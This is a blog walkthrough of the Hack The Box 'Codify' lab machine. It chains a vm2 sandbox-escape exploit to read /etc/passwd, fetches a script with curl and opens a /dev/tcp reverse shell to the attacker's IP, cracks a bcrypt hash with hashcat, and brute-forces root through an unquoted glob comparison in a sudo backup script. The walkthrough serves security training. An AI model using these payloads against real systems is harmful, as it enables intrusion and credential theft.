---
layout: post
title: Codify
date: 2024-01-25 10:14:00-0400
description: Codify - Hack The Box walkthrough.
tags: easy-box HTB arbitrary-code-execution ace remote-code-exeuction rce glob globbing secure-coding insecure-coding node.js
categories: HTB-Machines
thumbnail: /assets/img/2024-codify/20240125-codify.png
giscus_comments: false
related_posts: true
toc:
  sidebar: left
featured: false

---

# Introduction
---
Codify presents as a moderately challenging easy box, characterised by a privilege escalation that requires a bit of knowledge of bash secure scripting.

Initial access is obtained by  web-based Node.js code editor sandbox that allows arbitrary code execution on the host. Arbitrary code is then leveraged to fetch a reverse shell and achieve remote code execution.

From there a hash is stolen following further system enumeration. Cracking the hash  enables laterally movement, and privilege escalation is achieved by exploiting a vulnerability in a custom backup script that a standard user has elevated privileges over.

The box exemplifies the importance of secure coding practices, and the need to use strong, complex, passphrases.


## Methods


### Sandbox escape
A sandbox escape refers to an exploit in which malicious code or software breaks out of the sandbox environment in which it's supposed to be contained. Sandboxing is a security mechanism that isolates applications, processes, or code to reduce the potential harm from a compromised system.


### Arbitrary code execution
Arbitrary code execution is a security vulnerability that occurs when an attacker gains the ability to execute any code of their choice on a target system. This type of exploit allows the attacker to run commands that the system's designers did not intend to permit, often leading to unauthorised actions such as data theft, system compromise, or further exploitation of other vulnerabilities.

Key aspects of arbitrary code execution include:

1. **Control Over Execution Flow:** The attacker finds a way to divert the normal execution flow of a program, injecting or directing it to run unexpected code.
    
2. **Running Unauthorised Commands:** The code executed can do anything that the application's permissions allow, depending on the system's privileges and security controls.
    
3. **Common Causes:** It often results from vulnerabilities like buffer overflows, injection flaws, insecure deserialization, or other weaknesses that allow an attacker to inject malicious code into a process.
    
4. **Severity:** Arbitrary code execution is considered a severe security issue because it can lead to complete system takeover, data breaches, or serve as a gateway for further attacks.
    
5. **Mitigation:** Prevention includes secure coding practices, input validation, using memory-safe languages, regular security testing, and keeping systems updated with security patches.


### Remote code execution
Remote Code Execution (RCE) is a severe security vulnerability that allows an attacker to run arbitrary code on a target machine or server across a network, such as the internet, without having physical access to it. This type of vulnerability is particularly dangerous as it can be exploited remotely to gain control over another system.

The distinction between RCE and ACE lies in the attack vector.

- RCE is specifically about remote exploitation, where the attack occurs over a network.
- ACE is a broader term that covers any situation (both local and remote) where an attacker can execute code of their choice but does not specify the method of delivery.

In the context of this post, the arbitrary code execution relates to running commands in the codify editor that the system did not intend to allow, whereas remote code execution relates to when a reverse shell is established and execution of commands was done remotely to the system.


## Tools
- <a href="https://github.com/nmap/nmap">Nmap</a>
- <a href="https://github.com/koalaman/shellcheck">Shellcheck</a>
- <a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">Sandbox Escape in vm2@3.9.16</a>


## Tactics
- Dictionary attack (Hashcat)
- Brute forcing (glob matching)


# Enumeration
As always, enumeration starts with Nmap scanning.


## Nmap scanning

```bash
nmap -A 10.129.6.167 | tee nmap-output.txt
```

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-24 04:53 GMT
Nmap scan report for 10.129.6.167
Host is up (0.25s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.50 seconds
```

### Findings

1. Three ports open:
	- 22
	- 80
	- 3000

2. Domain name http://codify.htb


## Domain enumeration
The domain http://codify.htb can be added to the local hosts file:

```bash
echo "10.129.6.167 codify.htb" | sudo tee -a /etc/hosts
10.129.6.167 codify.htb
```

This makes it reachable and reveals a page that purports to allow Node.js code to be tested in a sandbox environment. The site states that:

> *"Codify is a simple web application that allows you to test your Node.js code easily...Codify uses sandboxing technology to run your code. This means that your code is executed in a safe and secure environment, without any access to the underlying system."*

<img src="/assets/img/2024-codify/20240125-codify-webpage.png" alt="20240125-codify-webpage.png" class="auto-resize">

The site also lists some limitations that are in place for security of the platform. These include restricting the importation of `child_processes` and `fs` modules.

The site goes on to say:

>"*This is to prevent users from executing arbitrary system commands, which could be a major security risk.*"

Then lists the following modules as being available for import:
- url 
- crypto
- util
- events
- assert
- stream
- path
- os
- zlib

Another page details that the Code Editor uses the **vm2** library. Clicking the link leads to the **3.9.16 version release of vm2**.

Researching **vm2** version 3.9.16 reveals a critical **sandbox breakout** vulnerability: https://nvd.nist.gov/vuln/detail/CVE-2023-29199

> "*attackers (can) bypass `handleException()` and leak unsanitized host exceptions which can be used to escape the sandbox and run arbitrary code in host context...*"


## What is Node.js
Node.js is an open-source, cross-platform JavaScript runtime environment that executes JavaScript code outside of a web browser. It's built on Chrome's V8 JavaScript engine and allows developers to use JavaScript to write command-line tools and for server-side scripting—running scripts server-side to produce dynamic web page content before the page is sent to the user's web browser.


# Exploitation

## Proof of Concept
<a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">Sandbox Escape in vm2@3.9.16</a>


**vm2** is a module in Node.js that creates isolated environments (sandboxes) to safely run untrusted JavaScript code. In **version 3.9.16 of vm2**, there is a security flaw in the way it processes errors or exceptions. Normally, vm2 should prevent code inside the sandbox from affecting or accessing the host system. The flaw involves a complex interaction where a custom error object can be manipulated to bypass vm2's security checks. By exploiting this, an attacker can execute any code they want on the host system, not just within the sandbox.

An example of how this vulnerability could be used to display the contents of the `/etc/passwd` file, which is a common file in Unix-like systems that contains user account information is:

```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd');
}
`

console.log(vm.run(code));

```

In this code:
- A custom error object `err` and a `handler` are created with a method that triggers an error.
- A JavaScript feature called `Proxy` is used to intercept operations on the `err` object, specifically the `getPrototypeOf` operation, which is supposed to return an object's prototype.
- In the `try...catch` block, the proxied error object is thrown. Due to the vulnerability, the `catch` block is manipulated to access Node.js's core modules.
- The `child_process` module's `execSync` function is then used to execute the `cat /etc/passwd` command, displaying the contents of the `/etc/passwd` file.
- This output is then logged to the console.

Running this code in the page's editor successfully returns the contents of the `/etc/passwd` file, demonstrating the breakout and arbitrary command execution.

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
fwupd-refresh:x:114:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

## Initial access
The objective now is to use the PoC to achieve **remote code execution** by manipulating the target to fetch a reverse shell.


### Staging
To achieve this a simple file containing a reverse shell can be created:

```bash
#!/bin/bash
sh -i >& /dev/tcp/10.10.14.15/4321 0>&1
```

The command has the following components:

- `#!/bin/bash` is the shebang line that tells the system this is a Bash script.
- `nc` is the Netcat command.
- `10.10.14.15` is the IP address where your Netcat listener is running.
- `4321` is the port on which your Netcat listener is listening.
- `-e /bin/bash` tells Netcat to execute the `/bin/bash` shell upon connecting. This will give the listener shell access to the system running the script.

The file is saved as `shell.sh`.

The file can then be served with a simple webserver:

```python
python3 -m http.server 8080
```

The target can then be manipulated into fetching the shell by adding `curl http://10.10.14.15:8080/shell.sh -o shell` to the `execSync()` function in PoC like so:

```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('curl http://10.10.14.15:8080/shell.sh -o shell');
}
`

console.log(vm.run(code));
```

The python webserver confirms the file was successfully fetched:

```python
└──╼ [★]$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.6.167 - - [24/Jan/2024 05:41:48] "GET /shell.sh HTTP/1.1" 200 -
```


### Exploitation
The next step is to make the file executable by sending `chmod +x shell` in the `execSync()` function.

Then, after starting a `netcat`listener, the shell can be executed by sending `bash -x shell` to the target:

```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('bash -x shell');
}
`

console.log(vm.run(code));
```

The listener successfully captures the reverse shell:

```bash
└──╼ [★]$ nc -lnvp 4321
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4321
Ncat: Listening on 0.0.0.0:4321
Ncat: Connection from 10.129.6.167.
Ncat: Connection from 10.129.6.167:44946.
sh: 0: can't access tty; job control turned off
$ whoami
svc
$ 
```


### Upgrading the shell
The shell can then be upgraded for interactivity using:

```python
$ python3 -c "import pty;pty.spawn('/bin/bash')"

svc@codify:/home$ 

```


## Lateral movement
Exploring the site's `/www` directory in the root `/var` directory finds a `tickets.db` file.

Catting this file finds a hash for the user `joshua`.

```bash
svc@codify:/var/www/contact$ cat tickets.db
cat tickets.db
�T5��T�format 3@  .WJ
       otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��	tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
��G�joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/<REDACTED>/p/Zw2
��
����ua  users
             ickets
r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open� ;�wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!opensvc@codify:/var/www/contact$ 
```

The hash appears to be a bcrypt hash. 

> *Bcrypt hashes are recognisable by their format, which usually starts with `$2a$`, `$2b$`, `$2x$`, or `$2y$` followed by a cost parameter (like `$12$` in your hash), and then the salt and hash value.*

The hash can be formatted for hashcat by dropping the username and adding it to a file (or passing it directly to the command).

In Hashcat, the mode to use for cracking bcrypt hashes is `3200`:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 7543 32-Core Processor, 7855/7919 MB (1979 MB allocatable), 4MCU

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
=============================================================================================================================
* Device #2: pthread-AMD EPYC 7543 32-Core Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

```

The hash cracks

<img src="/assets/img/2024-codify/20240125-codify-hash.png" alt="20240125-codify-hash.png" class="auto-resize">

With the acquired password, SSH can be used to authenticate to the target as the user **joshua.**

And the user flag is obtained.

```ssh
└──╼ [★]$ ssh joshua@10.129.6.167
joshua@codify:~$ ls
user.txt
joshua@codify:~$ cat user.txt 
<REDACTED>

```


## Privilege escalation
A helpful check for privilege escalation is to review sudo permissions.

Using `sudo -l` it can be seen that the user has sudo rights over the `/opt/scripts/mysql-backup.sh` file.

```bash
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh

```

As the name suggests, the script is designed to back up MySQL databases.

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

```

The script does the following:
1. **Setting Variables:**
    - `DB_USER="root"`: Defines the database username, in this case, `root`.
    - `DB_PASS=$(/usr/bin/cat /root/.creds)`: Retrieves the MySQL root user's password from a file located at `/root/.creds`.
      
2. **Password Confirmation:**
    - The script prompts the user to enter the MySQL password for the root user. This is done securely (without echoing the input) using `read -s -p`.
    - It then checks if the entered password (`USER_PASS`) matches the one stored in `/root/.creds` (`DB_PASS`). If they don't match, the script prints an error message and exits.
      
3. **Creating Backup Directory:**
    - The script ensures that the backup directory (`/var/backups/mysql`) exists, creating it if necessary with `mkdir -p`.
      
4. **Retrieving Database Names:**
    - It retrieves a list of all databases (excluding `information_schema`, `performance_schema`, and the `Database` header) using a MySQL command. The list of databases is stored in the variable `databases`.
      
5. **Backing Up Each Database:**
    - The script loops through each database in the `databases` variable.
    - For each database (`db`), it performs a backup using `mysqldump` and compresses the output to a `.sql.gz` file in the backup directory. Each backup file is named after the database.
      
6. **Post-backup Steps:**
    - After backing up all the databases, the script prints a success message.
    - It then changes the ownership of the backup directory to the `root` user and `sys-adm` group.
    - The script modifies the permissions of the backup directory and its contents to `774` (read/write/execute for owner and group, read for others).
    - Finally, it prints 'Done!' to indicate completion.

In summary, this script is a utility for backing up all MySQL databases on a server. It first confirms that the user running the script knows the MySQL root password, then proceeds to back up each database to a specified directory, securing the backups with appropriate permissions and ownership.

> *After a fair bit of research, I came across <a href="https://blnknlights.github.io/htb/machines/easy/codify/codify.html">this great write up</a> that put me onto a track without just giving me the answer.*


### Shellcheck
Using a utility called `shellcheck`, the `mysql-backup.sh` can be assessed:

```bash
└──╼ [★]$ shellcheck shell.sh

In shell.sh line 6:
read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
^--^ SC2162: read without -r will mangle backslashes.


In shell.sh line 9:
if [[ $DB_PASS == $USER_PASS ]]; then
                  ^--------^ SC2053: Quote the right-hand side of == in [[ ]] to prevent glob matching.

For more information:
  https://www.shellcheck.net/wiki/SC2053 -- Quote the right-hand side of == i...
  https://www.shellcheck.net/wiki/SC2162 -- read without -r will mangle backs...

```

As shown, it gives the warning that:

> "*Quote the right-hand side of == in [[ ]] to prevent glob matching.*"



### What is glob matching
Glob matching, in the context of shell scripts, refers to a feature where certain characters (like `*`, `?`, `[`, and `]`) are used as wildcards to match filenames or strings. This is commonly used in file operations but can also apply to string comparisons in conditional statements.

In the script,  `[[ $DB_PASS == $USER_PASS ]]` doesn't quote `$USER_PASS`, which means the shell tries to perform glob matching instead of matching the literal string with the value of `$USER_PASS`. This means:

- If `$USER_PASS` contains a `*`, it could match any string of characters.
- If `$USER_PASS` contains a `?`, it could match any single character.
- If `$USER_PASS` contains `[` and `]`, it could match any characters inside the brackets.

This behaviour can lead to unexpected results or security vulnerabilities. For instance, if `$USER_PASS` somehow contains `*`, the condition might unexpectedly evaluate to true.

To prevent glob matching and ensure the script is comparing the actual string value of `$USER_PASS` with `$DB_PASS`, you should quote `$USER_PASS`:

```bash
if [[ $DB_PASS == "$USER_PASS" ]]; then
    ...
fi

```

This change ensures that the value of `$USER_PASS` is taken literally, without any glob matching.


### Brute-forcing the password
With the help of ChatGPT, the following script can brute force the password by glob matching the next character iteratively.

```python
import string
import subprocess

def attempt_password(current_password):
    try:
        # Execute the password check command
        command = f"echo '{current_password}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.check_output(
            command,
            shell=True,
            stderr=subprocess.STDOUT,
            text=True
        )
        return "Password confirmed!" in output
    except subprocess.CalledProcessError:
        return False

all_chars = string.ascii_letters + string.digits
password = ""

while True:
    for char in all_chars:
        if attempt_password(password + char):
            password += char
            print(f"Current Password: {password}")
            break
    else:
        # Exit the loop if no additional character matches
        break

print(f"Final Password: {password}" if password else "Password not found.")

```

With the globbed password, and switching to the **root** user, the final flag is captured.

```bash
joshua@codify:~$ su root
Password: 
root@codify:/home/joshua# cd ~
root@codify:~# ls
root.txt  scripts
root@codify:~# cat root.txt 
<REDACTED>
root@codify:~# 

```